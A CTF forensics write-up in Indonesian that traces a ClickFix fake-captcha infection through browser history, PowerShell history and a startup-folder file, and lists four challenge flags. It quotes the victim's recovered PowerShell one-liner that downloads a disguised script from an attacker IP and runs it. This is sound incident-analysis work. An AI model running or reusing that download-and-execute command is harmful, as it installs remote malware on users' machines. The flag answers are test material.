# CTF Writeup — ClickFix Incident Chain

**Event:** CTF@CIT 2026  
**Category:** Forensics  
**Difficulty:** Medium  
**Artifacts:** `challenge.zip` (sudah diekstrak menjadi folder `kurt_backup`)

---

## Challenge Set

Serangkaian soal ini saling terhubung dari satu artefak forensik user profile Windows. Fokus utamanya adalah investigasi insiden ClickFix/pseudo-captcha yang memaksa korban menjalankan PowerShell.

Challenge yang diselesaikan:

1. `The click that may have fixed`
2. `Autonomous`
3. `Ping Pong`
4. `Start Me Up`

---

## Initial Recon

Struktur data menunjukkan backup profil user Windows dengan artefak browser dan user activity yang cukup lengkap:

- `AppData/Local/Microsoft/Edge/User Data/Default/History`
- `AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt`
- `AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/e9fje2.txt`

IOC kunci yang ditemukan dari PowerShell history:

```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
$p='unewhaven.com'; Test-Connection $p -Count 6 | Out-Null; $j='http://23.179.17.92/az.ps1'; $c=Join-Path $env:APPDATA 'DiskCleaner.ps1'; Start-BitsTransfer -Source $j -Destination $c; & $c
```

Dari sini terlihat alur: ping domain tertentu, download payload PowerShell dari IP langsung, lalu eksekusi.

---

## 1) The click that may have fixed

**Pertanyaan:** kapan website berbahaya itu terakhir dikunjungi?

Langkah utama:

- Query DB `History` (SQLite) milik Edge.
- Ambil entri `visits` terbaru yang terkait situs jebakan.
- Konversi timestamp Chromium (microseconds sejak 1601-01-01 UTC).

Temuan:

- URL terakhir: `https://23.179.17.92:5067/`
- Title: `Download More RAM!`
- `visit_time`: `13420969646255949`
- Konversi UTC: `2026-04-18T07:07:26Z`

**Flag:** `CIT{2026-04-18T07:07:26Z}`

---

## 2) Autonomous

**Pertanyaan:** ASN apa yang terkait clickfix site?

Langkah utama:

- Ambil IOC IP dari artefak sebelumnya: `23.179.17.92`.
- Validasi ASN menggunakan BGP/WHOIS lookup.

Temuan:

- IP `23.179.17.92` berada pada ASN `399562` (`IZT-CLOUD-UNIVERSAL / IZT Cloud`).

**Flag:** `CIT{399562}`

---

## 3) Ping Pong

**Pertanyaan:** website apa yang di-ping oleh script PowerShell?

Langkah utama:

- Baca command history PowerShell (`ConsoleHost_history.txt`).
- Identifikasi argumen dari `Test-Connection`.

Temuan:

- Script melakukan ping ke: `unewhaven.com`

**Flag:** `CIT{unewhaven.com}`

---

## 4) Start Me Up

**Pertanyaan:** petunjuk persistence (startup) mengarah ke apa?

Langkah utama:

- Cek folder startup user:
  `AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/`
- Ditemukan file `e9fje2.txt` berisi string base64.
- Decode base64 untuk mendapatkan flag.

Temuan:

- Encoded: `Q0lUe3N0NHJ0X20zX3VwX2kxMV9uM3Yzcl9zdDBwfQ==`
- Decoded: `CIT{st4rt_m3_up_i11_n3v3r_st0p}`

**Flag:** `CIT{st4rt_m3_up_i11_n3v3r_st0p}`

---

## Seluruh Flag

1. `CIT{2026-04-18T07:07:26Z}`
2. `CIT{399562}`
3. `CIT{unewhaven.com}`
4. `CIT{st4rt_m3_up_i11_n3v3r_st0p}`

---

## Ringkasan Keseluruhan

Insiden ini memperlihatkan pola klasik ClickFix:

1. Korban mencari “download more RAM” lalu diarahkan ke halaman jebakan.
2. Halaman memancing eksekusi PowerShell manual.
3. Script melakukan konektivitas check ke domain (`unewhaven.com`) dan mengambil payload dari IP `23.179.17.92`.
4. Infrastruktur attacker terkait ASN `399562`.
5. Persistence ditanam lewat artefak startup (`e9fje2.txt`) yang berisi penanda/flag encoded.

Secara forensik, korelasi paling kuat datang dari kombinasi:

- Browser History timeline
- PSReadLine command history
- Startup folder artifact
- ASN enrichment IOC IP

---

## Solver

Solver untuk challenge utama (timestamp website terakhir) tersedia di:

- `solve.py`

Jalankan dari direktori `theclickthatmay`:

```bash
python3 solve.py
```
